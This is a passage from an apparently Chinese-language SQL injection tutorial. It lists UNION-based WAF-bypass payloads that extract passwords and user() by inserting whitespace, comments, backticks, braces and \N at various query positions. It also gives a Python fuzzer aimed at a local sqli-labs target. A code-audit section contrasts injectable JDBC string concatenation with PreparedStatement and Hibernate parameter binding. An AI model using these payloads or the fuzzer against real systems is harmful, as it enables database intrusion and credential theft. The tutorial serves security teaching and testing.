<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">+@ +&#39;&#39; -@ -&#39;&#39; ~@ ~&#39;&#39; ~&#34;&#34; !@ !&#34;&#34; @$ @. \N$
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">union select+@a1,password,3 from users %23
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">union select\N$a1,password,3 from users %23
</span></span></code></pre></td></tr></table>
</div>
</div><p>(6)函数</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">union select  MD5(&#39;a&#39;) |1,2,database() from users--+
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">union select reverse(&#39;xx&#39;),password,3 from users %23
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">union select ST_X(Point(1, 2))a,2,database() from users--+
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="位置四">位置四</h2>
<p>(1) 空白符</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">%09,%0a,%0b,%0c,%0d,%20,%23,%27
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-1&#39; union select 1,2,user()%23from users--+
</span></span></code></pre></td></tr></table>
</div>
</div><p>(2)注释</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/*!*/
</span></span><span class="line"><span class="cl">/**/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-1&#39; union select 1,2,user()/**/from users--+
</span></span></code></pre></td></tr></table>
</div>
</div><p>(3) 反引号</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#39; union select 1,2,password ``from users`` --+
</span></span></code></pre></td></tr></table>
</div>
</div><p>(4)花括号</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#39; union select 1,2,{x password}from users --+
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">1&#39; union select 1,2,(password)from users --+
</span></span></code></pre></td></tr></table>
</div>
</div><p>(5) 符号</p>
<p>\N</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#39; union select 1,password,\Nfrom users --+
</span></span></code></pre></td></tr></table>
</div>
</div><p>单双引号</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#39; union select 1,user(),&#34;&#34;from users --+
</span></span></code></pre></td></tr></table>
</div>
</div><p>e .</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#39; union select 1,password,3e1from users --+
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">1&#39; union select 1,password,3.1from users --+
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>组合</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">\N%0C  \N%23  \N%27  %7E\N  %21\N  %27\N   %2D\N  %7E\N %2D%2D%0A
</span></span><span class="line"><span class="cl">%27--  --%40   --%27 --&#34;&#34;
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">1&#39; union select 1,user(),\NXXXX%23from users --+
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">1&#39; union select 1,user(),%27XXXX--from users --+
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="位置五">位置五</h2>
<p>(1) 空白符</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># %09,%0a,%0b,%0c,%0d,%20,%2E</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">1<span class="err">&#39;</span> union <span class="k">select</span> 1,2,user<span class="o">()</span> from%0dusers--+
</span></span></code></pre></td></tr></table>
</div>
</div><p>(2)注释</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/*!*/ 
</span></span><span class="line"><span class="cl">/**/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-1<span class="err">&#39;</span> union <span class="k">select</span> 1,2,user<span class="o">()</span> from /**/users--+
</span></span></code></pre></td></tr></table>
</div>
</div><p>(3)花括号</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#39; union select 1,user(),3 from(users) --+  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">1&#39; union select 1,user(),3 from{x users} --+
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="fuzz">FUZZ</h2>
<p>已经知道上面五个位置了，单一姿势是无法奏效绕过的，有些姿势也是需要大量 FUZZ 得到，使用大量字符编码对 SQL 语句的“位”进行 FUZZ，可以自己编写脚本进行fuzz实现bypass。这里直接贴别人的代码了懒得自己写(自己实现的时候按照这个思路进行散发即可)：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">itertools</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">List</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;%20&#39;</span><span class="p">,</span><span class="s1">&#39;%09&#39;</span><span class="p">,</span><span class="s1">&#39;</span><span class="si">%0a</span><span class="s1">&#39;</span><span class="p">,</span><span class="s1">&#39;%0b&#39;</span><span class="p">,</span><span class="s1">&#39;</span><span class="si">%0c</span><span class="s1">&#39;</span><span class="p">,</span><span class="s1">&#39;</span><span class="si">%0d</span><span class="s1">&#39;</span><span class="p">,</span><span class="s1">&#39;</span><span class="si">%2d%2d</span><span class="s1">&#39;</span><span class="p">,</span><span class="s1">&#39;%23&#39;</span><span class="p">,</span><span class="s1">&#39;</span><span class="si">%a</span><span class="s1">0&#39;</span><span class="p">,</span><span class="s1">&#39;%2D%2D%2B&#39;</span><span class="p">,</span><span class="s1">&#39;%5C</span><span class="si">%4E</span><span class="s1">&#39;</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\\</span><span class="s1">N&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">count</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">num</span> <span class="o">=</span> <span class="mi">2</span> <span class="c1">#fuzz num 个字符组合</span>
</span></span><span class="line"><span class="cl"><span class="n">target</span> <span class="o">=</span> <span class="s1">&#39;http://localhost/sqli-labs-master/Less-1/?id=-1</span><span class="se">\&#39;</span><span class="s1"> &#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">itertools</span><span class="o">.</span><span class="n">product</span><span class="p">(</span><span class="n">List</span><span class="p">,</span><span class="n">repeat</span><span class="o">=</span><span class="n">num</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">count</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">count</span><span class="p">,</span><span class="s1">&#39;:&#39;</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">List</span><span class="p">)</span><span class="o">**</span><span class="n">num</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">str</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">((</span><span class="n">i</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="si">{}</span><span class="s1">union select 1,user(),3 from users %23&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">str</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">url</span> <span class="o">=</span> <span class="n">target</span> <span class="o">+</span> <span class="n">payload</span>
</span></span><span class="line"><span class="cl">    <span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s2">&#34;root@localhost&#34;</span> <span class="ow">in</span> <span class="n">req</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;result.txt&#34;</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="n">encoding</span><span class="o">=</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">r</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">r</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="nb">str</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h1 id="代码审计">代码审计</h1>
<h2 id="java">Java</h2>
<h3 id="java中执行sql语句的几种方式">Java中执行SQL语句的几种方式</h3>
<h4 id="1使用jdbc的javasqlstatement执行sql语句原生方式">1.使用JDBC的<code>java.sql.Statement</code>执行SQL语句（原生方式）</h4>
<p>是执行SQL语句的原生方式，需要通过拼接来执行，若拼接的语句没有经过过滤，将出现SQL注入漏洞</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.sql.*</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">TestSQL</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span> <span class="o">[]</span><span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;com.mysql.cj.jdbc.Driver&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">Connection</span> <span class="n">con</span> <span class="o">=</span> <span class="n">DriverManager</span><span class="o">.</span><span class="na">getConnection</span><span class="o">(</span><span class="s">&#34;jdbc:mysql://localhost:3306/jsxp_test?useUnicode=true&amp;characterEncoding=utf-8&amp;useSSL=false&amp;serverTimezone=UTC&#34;</span><span class="o">,</span><span class="s">&#34;test&#34;</span><span class="o">,</span><span class="s">&#34;test123&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">String</span> <span class="n">id</span> <span class="o">=</span> <span class="s">&#34;56&#34;</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">String</span> <span class="n">sql</span> <span class="o">=</span> <span class="s">&#34;select * from cms_tag where f_tag_id=&#34;</span> <span class="o">+</span> <span class="n">id</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">Statement</span> <span class="n">statement</span> <span class="o">=</span> <span class="n">con</span><span class="o">.</span><span class="na">createStatement</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">            <span class="n">ResultSet</span> <span class="n">rs</span> <span class="o">=</span> <span class="n">statement</span><span class="o">.</span><span class="na">executeQuery</span><span class="o">(</span><span class="n">sql</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">while</span> <span class="o">(</span><span class="n">rs</span><span class="o">.</span><span class="na">next</span><span class="o">()){</span>
</span></span><span class="line"><span class="cl">                <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;id: &#34;</span><span class="o">+</span><span class="n">rs</span><span class="o">.</span><span class="na">getInt</span><span class="o">(</span><span class="s">&#34;f_tag_id&#34;</span><span class="o">)</span> <span class="o">+</span> <span class="s">&#34;, name=&#34;</span> <span class="o">+</span> <span class="n">rs</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="s">&#34;f_name&#34;</span><span class="o">));</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){</span>
</span></span><span class="line"><span class="cl">            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="2使用jdbc的javasqlpreparedstatement执行sql语句">2.使用JDBC的<code>java.sql.PreparedStatement</code>执行SQL语句</h4>
<p>PreparedStatement是继承<code>statement</code>的子接口，包含已编译的SQL语句。</p>
<p>PreparedStatement会预处理SQL语句，SQL语句可具有一个或多个IN参数。IN参数的值在SQL语句创建时未被指定，而是为每个IN参数保留一个问号(?)作为占位符。每个问号的值，必须在该语句执行之前通过适当的<code>setXXX</code>方法来提供。如果是int型则用<code>setInt</code>，如果是string则用<code>setString</code>方法。</p>
<p>优势：速度快；防止SQL注入</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="c1">//package src.main.java;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">java</span><span class="p">.</span><span class="nx">sql</span><span class="p">.</span><span class="o">*</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">public</span> <span class="nx">class</span> <span class="nx">TestSQL</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">public</span> <span class="nx">static</span> <span class="nx">void</span> <span class="nf">main</span><span class="p">(</span><span class="nx">String</span> <span class="p">[]</span><span class="nx">args</span><span class="p">)</span> <span class="nx">throws</span> <span class="nx">Exception</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nx">Class</span><span class="p">.</span><span class="nf">forName</span><span class="p">(</span><span class="s">&#34;com.mysql.cj.jdbc.Driver&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Connection</span> <span class="nx">con</span> <span class="p">=</span> <span class="nx">DriverManager</span><span class="p">.</span><span class="nf">getConnection</span><span class="p">(</span><span class="s">&#34;jdbc:mysql://localhost:3306/jsxp_test?useUnicode=true&amp;characterEncoding=utf-8&amp;useSSL=false&amp;serverTimezone=UTC&#34;</span><span class="p">,</span><span class="s">&#34;test&#34;</span><span class="p">,</span><span class="s">&#34;test123&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nx">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">String</span> <span class="nx">f_tag_id</span> <span class="p">=</span> <span class="s">&#34;56&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nx">String</span> <span class="nx">sql</span> <span class="p">=</span> <span class="s">&#34;select * from cms_tag where f_tag_id= ?&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nx">PreparedStatement</span> <span class="nx">pstatement</span> <span class="p">=</span> <span class="nx">con</span><span class="p">.</span><span class="nf">prepareStatement</span><span class="p">(</span><span class="nx">sql</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//设置占位符id变量(第一个参数为第几个?的索引)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nx">pstatement</span><span class="p">.</span><span class="nf">setString</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nx">f_tag_id</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//执行
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nx">ResultSet</span> <span class="nx">rs</span> <span class="p">=</span> <span class="nx">pstatement</span><span class="p">.</span><span class="nf">executeQuery</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="nf">while</span> <span class="p">(</span><span class="nx">rs</span><span class="p">.</span><span class="nf">next</span><span class="p">()){</span>
</span></span><span class="line"><span class="cl">                <span class="nx">System</span><span class="p">.</span><span class="nx">out</span><span class="p">.</span><span class="nb">println</span><span class="p">(</span><span class="s">&#34;id: &#34;</span><span class="o">+</span><span class="nx">rs</span><span class="p">.</span><span class="nf">getInt</span><span class="p">(</span><span class="s">&#34;f_tag_id&#34;</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#34;, name=&#34;</span> <span class="o">+</span> <span class="nx">rs</span><span class="p">.</span><span class="nf">getString</span><span class="p">(</span><span class="s">&#34;f_name&#34;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="nf">catch</span> <span class="p">(</span><span class="nx">Exception</span> <span class="nx">e</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="nx">e</span><span class="p">.</span><span class="nf">printStackTrace</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="3使用herbinate执行sql语句">3.使用Herbinate执行SQL语句</h4>
<p>Hibernate将Java类映射到数据库表中，从Java数据类型映射到SQL数据类型，采用Hibernate查询语言（HQL）。</p>
<p>HQL语法与SQL类似，但有些许不同。</p>
<p>Hibernate对持久化类的对象进行操作也不是直接对数据库进行操作，因此HQL由Hibernate引擎进行解析，这意味着产生的错误信息可能来自数据库，也可能来自Hibernate引擎。</p>
<p><strong>Hibernate有几种HQL参数绑定的方式可以有效避免SQL注入：</strong></p>
<p>1.按命名参数绑定（参数名字）</p>
<p>在HQL语句中定义命名参数要用”:”开头</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Query</span><span class="o">&lt;</span><span class="n">User</span><span class="o">&gt;</span> <span class="n">query</span><span class="o">=</span><span class="n">session</span><span class="o">.</span><span class="na">createQuery</span><span class="o">(</span><span class="err">“</span><span class="n">from</span> <span class="n">User</span> <span class="n">user</span> <span class="n">where</span> <span class="n">user</span><span class="o">.</span><span class="na">name</span><span class="o">=:</span><span class="n">username</span>  <span class="err">”</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="n">String</span> <span class="n">parm</span> <span class="o">=</span> <span class="s">&#34;Liming&#34;</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="n">query</span><span class="o">.</span><span class="na">setString</span><span class="o">(</span><span class="s">&#34;name&#34;</span><span class="o">,</span> <span class="n">parm</span><span class="o">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>2.按参数位置邦定：</p>
<p>在HQL查询语句中用”?”来定义参数位置，形式如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Query</span> <span class="n">query</span><span class="o">=</span><span class="n">session</span><span class="o">.</span><span class="na">createQuery</span><span class="o">(</span><span class="err">“</span><span class="n">from</span> <span class="n">User</span> <span class="n">user</span> <span class="n">where</span> <span class="n">user</span><span class="o">.</span><span class="na">name</span><span class="o">=?</span> <span class="n">and</span> <span class="n">user</span><span class="o">.</span><span class="na">age</span> <span class="o">=?</span> <span class="err">”</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="n">query</span><span class="o">.</span><span class="na">setString</span><span class="o">(</span><span class="mi">0</span><span class="o">,</span><span class="n">name</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="n">query</span><span class="o">.</span><span class="na">setInteger</span><span class="o">(</span><span class="mi">1</span><span class="o">,</span><span class="n">age</span><span class="o">);</span>	<span class="c1">// 索引，变量
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// 　同样使用setXXX()方法设定绑定参数，只不过这时setXXX()方法的第一个参数代表绑定参数在HQL语句中出现的位置编号（由0开始编号），第二个参数仍然代表参数实际值。
</span></span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>注：在实际开发中，提倡使用按名称绑定命名参数，因为这不但可以提供非常好的程序可读性，而且也提高了程序的易维护性，因为当查询参数的位置发生改变时，按名称邦定名参 数的方式中是不需要调整程 序代码的。</p>
</blockquote>
<p>3.命名参数列表</p>
<p>4.类实例（JavaBean）</p>
<p>在Hibernate中可以使用setProperties()方法，将命名参数与一个对象的属性值绑定在一起，如下程序代码：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Customer</span> <span class="n">customer</span><span class="o">=</span><span class="k">new</span> <span class="n">Customer</span><span class="o">();</span>
</span></span><span class="line"><span class="cl"><span class="n">customer</span><span class="o">.</span><span class="na">setName</span><span class="o">(</span><span class="err">“</span><span class="n">pansl</span><span class="err">”</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="n">customer</span><span class="o">.</span><span class="na">setAge</span><span class="o">(</span><span class="mi">80</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="n">Query</span> <span class="n">query</span><span class="o">=</span><span class="n">session</span><span class="o">.</span><span class="na">createQuery</span><span class="o">(</span><span class="err">“</span><span class="n">from</span> <span class="n">Customer</span> <span class="n">c</span> <span class="n">where</span> <span class="n">c</span><span class="o">.</span><span class="na">name</span><span class="o">=:</span><span class="n">name</span> <span class="n">and</span> <span class="n">c</span><span class="o">.</span><span class="na">age</span><span class="o">=:</span><span class="n">age</span> <span class="err">”</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="n">query</span><span class="o">.</span><span class="na">setProperties</span><span class="o">(</span><span class="n">customer</span><span class="o">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>5.setParameter()方法：</p>
<p>　在Hibernate的HQL查询中可以通过setParameter()方法邦定任意类型的参数，如下代码:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
